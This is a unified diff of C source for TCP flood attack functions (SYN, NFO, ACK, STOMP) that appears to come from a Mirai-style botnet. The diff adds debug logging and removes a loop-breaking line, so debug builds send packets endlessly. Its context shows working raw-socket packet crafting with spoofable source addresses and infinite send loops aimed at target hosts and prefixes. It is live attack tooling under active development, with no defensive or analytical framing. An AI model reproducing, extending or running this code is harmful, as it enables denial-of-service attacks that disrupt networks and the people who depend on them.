@@ -35,19 +35,37 @@ void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts
     BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
     uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
 
+#ifdef DEBUG
+    printf("[TCP_SYN] Starting TCP SYN attack\n");
+    printf("[TCP_SYN] Targets: %u, Options: %u\n", (unsigned)targs_len, (unsigned)opts_len);
+    printf("[TCP_SYN] Sport: %u, Dport: %u, TTL: %u\n", (unsigned)sport, (unsigned)dport, (unsigned)ip_ttl);
+    printf("[TCP_SYN] Flags: SYN=%d, ACK=%d, PSH=%d, RST=%d, URG=%d, FIN=%d\n", 
+           syn_fl, ack_fl, psh_fl, rst_fl, urg_fl, fin_fl);
+    debug_logf("=== TCP SYN ATTACK START ===\n");
+    debug_logf("Targets: %u, Sport: %u, Dport: %u, TTL: %u\n", 
+               (unsigned)targs_len, (unsigned)sport, (unsigned)dport, (unsigned)ip_ttl);
+#endif
+
     if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
     {
 #ifdef DEBUG
-        printf("Failed to create raw socket. Aborting attack\n");
+        printf("[TCP_SYN] Failed to create raw socket. Aborting attack\n");
+        debug_logf("TCP SYN: Failed to create raw socket\n");
 #endif
         return;
     }
+    
+#ifdef DEBUG
+    printf("[TCP_SYN] Raw socket created successfully (fd=%d)\n", fd);
+    debug_logf("TCP SYN: Raw socket created successfully (fd=%d)\n", fd);
+#endif
     
     i = 1;
     if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
     {
 #ifdef DEBUG
-        printf("Failed to set IP_HDRINCL. Aborting\n");
+        printf("[TCP_SYN] Failed to set IP_HDRINCL. Aborting\n");
+        debug_logf("TCP SYN: Failed to set IP_HDRINCL\n");
 #endif
         close(fd);
         return;
@@ -114,6 +132,12 @@ void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         *opts++ = 6; // 2^6 = 64, window size scale = 64
     }
 
+#ifdef DEBUG
+    printf("[TCP_SYN] Starting main attack loop\n");
+    debug_logf("TCP SYN: Starting main attack loop\n");
+    int packet_count = 0;
+#endif
+
     while (TRUE)
     {
         for (i = 0; i < targs_len; i++)
@@ -121,6 +145,23 @@ void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             char *pkt = pkts[i];
             struct iphdr *iph = (struct iphdr *)pkt;
             struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
+
+#ifdef DEBUG
+            packet_count++;
+            if (packet_count % 1000 == 0) {
+                printf("[TCP_SYN] Sent %d packets so far\n", packet_count);
+                debug_logf("TCP SYN: Sent %d packets so far\n", packet_count);
+            }
+            if (packet_count <= 10) {
+                printf("[TCP_SYN] Sending packet %d to %u.%u.%u.%u:%u\n", 
+                       packet_count,
+                       (unsigned char)(targs[i].addr & 0xff),
+                       (unsigned char)((targs[i].addr >> 8) & 0xff),
+                       (unsigned char)((targs[i].addr >> 16) & 0xff),
+                       (unsigned char)((targs[i].addr >> 24) & 0xff),
+                       (unsigned)ntohs(targs[i].sock_addr.sin_port));
+            }
+#endif
             
             // For prefix attacks
             if (targs[i].netmask < 32)
@@ -148,10 +189,18 @@ void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + 20);
 
             targs[i].sock_addr.sin_port = tcph->dest;
-            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+            int sent = sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+            
+#ifdef DEBUG
+            if (sent == -1) {
+                printf("[TCP_SYN] ERROR: sendto failed (errno=%d)\n", errno);
+                debug_logf("TCP SYN: sendto failed (errno=%d)\n", errno);
+            } else if (packet_count <= 10) {
+                printf("[TCP_SYN] Successfully sent %d bytes\n", sent);
+            }
+#endif
         }
 #ifdef DEBUG
-            break;
             if (errno != 0)
                 printf("errno = %d\n", errno);
 #endif
@@ -181,6 +230,17 @@ void attack_tcp_nfo(uint8_t targs_len, struct attack_target *targs, uint8_t opts
     int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 128);
     BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
     uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, 0xffffffff);
+
+#ifdef DEBUG
+    printf("[TCP_NFO] Starting TCP NFO attack\n");
+    printf("[TCP_NFO] Targets: %u, Options: %u\n", (unsigned)targs_len, (unsigned)opts_len);
+    printf("[TCP_NFO] Sport: %u, Dport: %u, Data len: %d\n", (unsigned)sport, (unsigned)dport, data_len);
+    printf("[TCP_NFO] Flags: SYN=%d, ACK=%d, PSH=%d, RST=%d, URG=%d, FIN=%d\n", 
+           syn_fl, ack_fl, psh_fl, rst_fl, urg_fl, fin_fl);
+    debug_logf("=== TCP NFO ATTACK START ===\n");
+    debug_logf("Targets: %u, Sport: %u, Dport: %u, Data len: %d\n", 
+               (unsigned)targs_len, (unsigned)sport, (unsigned)dport, data_len);
+#endif
 
     if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
     {
@@ -325,6 +385,17 @@ void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts
     BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
     uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
 
+#ifdef DEBUG
+    printf("[TCP_ACK] Starting TCP ACK attack\n");
+    printf("[TCP_ACK] Targets: %u, Options: %u\n", (unsigned)targs_len, (unsigned)opts_len);
+    printf("[TCP_ACK] Sport: %u, Dport: %u, Data len: %d\n", (unsigned)sport, (unsigned)dport, data_len);
+    printf("[TCP_ACK] Flags: SYN=%d, ACK=%d, PSH=%d, RST=%d, URG=%d, FIN=%d\n", 
+           syn_fl, ack_fl, psh_fl, rst_fl, urg_fl, fin_fl);
+    debug_logf("=== TCP ACK ATTACK START ===\n");
+    debug_logf("Targets: %u, Sport: %u, Dport: %u, Data len: %d\n", 
+               (unsigned)targs_len, (unsigned)sport, (unsigned)dport, data_len);
+#endif
+
     if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
     {
 #ifdef DEBUG
@@ -453,6 +524,17 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
     BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
     int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 128);
     BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
+
+#ifdef DEBUG
+    printf("[TCP_STOMP] Starting TCP STOMP attack\n");
+    printf("[TCP_STOMP] Targets: %u, Options: %u\n", (unsigned)targs_len, (unsigned)opts_len);
+    printf("[TCP_STOMP] Dport: %u, Data len: %d\n", (unsigned)dport, data_len);
+    printf("[TCP_STOMP] Flags: SYN=%d, ACK=%d, PSH=%d, RST=%d, URG=%d, FIN=%d\n", 
+           syn_fl, ack_fl, psh_fl, rst_fl, urg_fl, fin_fl);
+    debug_logf("=== TCP STOMP ATTACK START ===\n");
+    debug_logf("Targets: %u, Dport: %u, Data len: %d\n", 
+               (unsigned)targs_len, (unsigned)dport, data_len);
+#endif
 
     // Set up receive socket
     if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
